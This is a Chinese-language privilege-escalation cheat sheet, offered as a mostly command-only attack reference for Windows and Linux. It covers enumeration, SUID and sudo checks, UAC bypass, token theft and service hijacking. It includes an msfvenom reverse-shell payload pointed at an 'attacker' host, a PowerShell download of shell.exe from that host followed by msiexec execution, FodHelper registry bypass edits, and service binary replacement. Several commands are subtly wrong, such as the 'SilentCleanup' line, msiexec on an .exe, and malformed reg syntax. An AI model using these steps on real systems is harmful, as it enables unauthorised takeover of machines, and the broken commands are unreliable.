# 权限提升

## 1. Windows提权

### 信息收集

```cmd
systeminfo
whoami /all
net user username
net localgroup administrators
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### 查找可利用服务

```cmd
sc query state=all
accesschk.exe -uwcqv "Authenticated Users" *
```

### DLL劫持

- 查找可写目录
- 劫持DLL

### AlwaysInstallElevated

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

### 服务路径空格

```
sc qc service_name
```

### 注册表AlwaysInstallElevated利用

```powershell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe -o shell.exe
powershell -Command "Invoke-WebRequest -Uri http://attacker/shell.exe -OutFile C:\Windows\Temp\shell.exe"
msiexec /q /i C:\Windows\Temp\shell.exe
```

---

## 2. Linux提权

### 信息收集

```bash
uname -a
cat /etc/issue
cat /etc/*-release
id
whoami
```

### SUID文件

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

### SUDO配置

```bash
sudo -l
cat /etc/sudoers
```

### 可写目录

```bash
find / -writable -type d 2>/dev/null
```

### Cron任务

```bash
cat /etc/crontab
ls -la /etc/cron*
crontab -l
```

### 内核漏洞

```bash
searchsploit linux kernel $(uname -r)
./linux-exploit-suggester.sh
```

### 环境变量利用

```bash
echo $PATH
find / -perm -u=s -type f 2>/dev/null
# 查找可执行文件
```

---

## 3. UAC绕过

### 方法1: SilentCleanup

```cmd
cmd /c set __COMPAT_LAYER=RunAsInvoker && reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Hidden /t REG_DWORD /d 1 /f && explorer.exe
```

### 方法2: FodHelper

```powershell
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "cmd /c calc" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /DelegateExecute "None"
```

---

## 4. 令牌窃取

### Incognito

```bash
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
```

### RottenPotato

```bash
rottenpotato.exe
```

### Juicy Potato

```bash
JuicyPotato.exe -l 1337 -p shell.exe -t *
```

---

## 5. 服务提权

### 可执行文件替换

```cmd
sc config ServiceName binPath= "malicious.exe"
sc start ServiceName
```

### 服务路径劫持

```
sc qc service_name
# 检查路径是否有空格
```
